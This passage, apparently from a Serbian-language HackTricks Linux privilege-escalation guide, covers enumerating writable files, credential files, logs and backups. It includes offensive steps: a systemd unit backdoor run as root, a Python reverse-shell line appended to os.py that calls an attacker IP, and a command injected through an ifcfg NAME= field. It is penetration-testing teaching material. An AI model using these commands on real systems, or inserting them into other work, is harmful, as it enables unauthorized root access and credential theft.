find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako na mašini radi **tomcat** server i možete **izmeniti Tomcat service configuration file inside /etc/systemd/,** onda možete izmeniti sledeće linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor biće izvršen sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudna lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjene datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml datoteke
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže passwords

Pregledajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko potencijalnih datoteka koje bi mogle da sadrže passwords**.\
**Još jedan interesantan alat** koji možete koristiti u tu svrhu je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koja je aplikacija otvorenog koda koja se koristi za dohvatanje velikog broja passwords pohranjenih na lokalnom računaru za Windows, Linux & Mac.

### Logovi

Ako možete čitati logove, možda ćete moći da pronađete **interesantne/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki "**loše**" konfigurisani (backdoored?) **audit logs** mogu vam omogućiti da **zabeleže passwords** unutar audit logs kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste mogli **čitati logove, grupa** [**adm**](interesting-groups-linux-pe/index.html#adm-group) biće zaista od pomoći.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe treba da proverite fajlove koji sadrže reč "**password**" u svom **imenu** ili u **sadržaju**, kao i da proverite IPs i emails u logovima, ili hashove pomoću regexps.\
Neću ovde navoditi kako se sve to radi, ali ako vas zanima možete pogledati poslednje provere koje izvršava [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Datoteke koje je moguće pisati

### Python library hijacking

Ako znate **odakle** će python skripta biti izvršena i **možete pisati u** taj folder ili možete **modify python libraries**, možete modifikovati OS library i backdoor it (ako možete pisati tamo gde će python skripta biti izvršena, kopirajte i nalepite os.py library).

Da biste **backdoor the library** jednostavno dodajte na kraj os.py library sledeću liniju (promenite IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacija logrotate

Ranljivost u `logrotate` omogućava korisnicima sa **write permissions** na fajlu sa logom ili njegovim roditeljskim direktorijumima da potencijalno dobiju povišene privilegije. To je zato što se `logrotate`, često pokrenut kao **root**, može manipulisanjem navesti da izvrši proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti permisije ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` verziju `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Možete iskoristiti ovu ranjivost pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god otkrijete da možete izmeniti logove, proverite ko ih upravlja i da li možete eskalirati privilegije zamenom logova symlinkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može **write** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može **adjust** postojeću, onda je vaš **system is pwned**.

Network scripts, _ifcg-eth0_ na primer, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, oni su \~sourced\~ na Linuxu od strane Network Manager (dispatcher.d).

U mom slučaju, `NAME=` atribut u ovim network skriptama nije pravilno obrađen. Ako imate **razmak u imenu, sistem pokuša da izvrši deo posle razmaka**. To znači da je **sve posle prvog razmaka izvršeno kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Obratite pažnju na prazno mesto između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servisa. Ove skripte mogu biti pokrenute direktno ili preko simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

Sa druge strane, `/etc/init` je povezan sa **Upstart**, novijim sistemom za **upravljanje servisima** koji je uveden od strane Ubuntu-a, koristeći konfiguracione fajlove za upravljanje servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste pored Upstart konfiguracija zbog kompatibilnog sloja u Upstart-u.

**systemd** se pojavljuje kao moderan init i menadžer servisa, nudeći napredne funkcije kao što su pokretanje daemona na zahtev, upravljanje automount-ovima i snimanje stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, pojednostavljujući administraciju sistema.

## Ostali trikovi

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hook-uju syscall da bi izložili privilegovanu kernel funkcionalnost userspace manageru. Slaba autentifikacija managera (npr. provera potpisa zasnovana na FD-order ili loši shemi lozinki) može omogućiti lokalnoj aplikaciji da se lažno predstavi kao manager i eskalira privilegije do root-a na uređajima koji su već root-ovani. Saznajte više i pogledajte detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery u VMware Tools/Aria Operations može izvući putanju do binarnog fajla iz command line procesa i pokrenuti je sa -v u privilegovanom kontekstu. Permisivni pattern-i (npr. korišćenje \S) mogu odgovarati attacker-staged listener-ima u zapisivim lokacijama (npr. /tmp/httpd), što dovodi do izvršenja kao root (CWE-426 Untrusted Search Path).

Saznajte više i pogledajte generalizovani pattern primenljiv na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Zaštite kernela

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc alati

### **Najbolji alat za pronalaženje Linux local privilege escalation vektora:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
